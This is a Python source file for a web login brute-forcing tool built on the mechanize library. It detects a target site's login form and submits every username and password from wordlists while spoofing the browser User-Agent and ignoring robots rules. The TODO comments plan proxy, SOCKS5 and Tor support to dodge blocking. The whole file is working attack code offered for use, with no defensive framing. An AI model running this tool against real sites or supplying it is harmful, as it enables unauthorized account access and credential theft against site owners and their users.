import actions, utils, sys, time, mechanize

##################################################################
#
#	TODO:
#		+) Reading huge file
#		+) Multi threading
#		+) Better form detecting and parsing
#		+) Better automatic login condition - gmail, etc..
#
#	TODO FURTHER
#		+) Proxy support
#		+) auto parse proxy list, brute forcing multi Proxy
#		+) sock 5, tor support
#
##################################################################

class BruteForcing(object):
	def __init__(self, optURL, optUsrList, optPassList):
		###############################################################
		#
		#	@Ic3W4ll
		#
		#	varTargetURL: <protocol>://<domain>/<path>
		#	varUserAgent: UserAgents; random choice from file
		#	frmLoginID: ID of login form, for mechanize.Browser().select_form(nr=ID)
		#	frmUsername: Username form's name, get from parse form
		#	frmPassword: Password form's name, get from parse form
		#	lstUsername: Username list, user's option / wordlist
		#	lstPassword: Passowrd list, user's option / wordlist
		#	szPassword:	Password list's size (number of lines/ words)
		#	fndData: Match usernames + passwords
		#
		################################################################

		self.varTargetURL = optURL
		self.varUserAgent = actions.action_getUserAgent()
		self.frmLoginID = 0
		self.frmUserField = ''
		self.frmPassField = ''
		self.lstUsername = optUsrList
		self.lstPassword = optPassList
		self.szPassword = actions.subaction_countListSize(self.lstPassword)
		self.fndData = []
		self.actTestConnection()

	def actTestConnection(self):
		process = mechanize.Browser()
		process.addheaders = [('User-Agent', self.varUserAgent)]
		process.set_handle_robots(False)
		utils.printf("Testing connection....")
		try:
			process.open(self.varTargetURL)
			utils.printf("Connected to URL. Gathering login form information...\n", "good")
			self.frmLoginID, self.frmUserField, self.frmPassField = actions.action_getFormInformation(process.forms())
			process.close()
		except mechanize.HTTPError as error:
			sys.exit(utils.craft_msg(error, "bad"))

	def actGetResult(self):
		return self.fndData

	def run(self):
		#Start brute forcing
		for idxUsername in self.lstUsername:

			count = 0
			idxUsername = idxUsername.replace('\n', '')

			proc = mechanize.Browser()
			proc.addheaders = [('User-Agent', self.varUserAgent)]
			proc.set_handle_robots(False)
			proc.open(self.varTargetURL)

			for idxPasswd in self.lstPassword:
				idxPasswd = idxPasswd.replace('\n', '')

				try:
					proc.select_form(nr = self.frmLoginID)
					proc.form[self.frmUserField] = idxUsername
					proc.form[self.frmPassField] = idxPasswd
					count += 1
					utils.prints("%10s : %20s%12s%10s / %10s" %(idxUsername, idxPasswd, '=' * 6, count, self.szPassword))
					req = proc.submit()
					try:
						proc.reload()
						proc.select_form(nr = self.frmLoginID)
					except mechanize._mechanize.FormNotFoundError:
						utils.printf("Found: %s:%s" %(idxUsername, idxPasswd), "good")
						self.fndData.append([idxUsername, idxPasswd])
						break

				except mechanize.HTTPError as error:
					sys.exit(utils.craf_msg(error, "bad"))

				except KeyboardInterrupt:
					sys.exit(utils.craft_msg("Terminated!!!", "bad"))

			if count == self.szPassword:
				utils.printf("%s: No match found." %(idxUsername), "bad")
			proc.close()

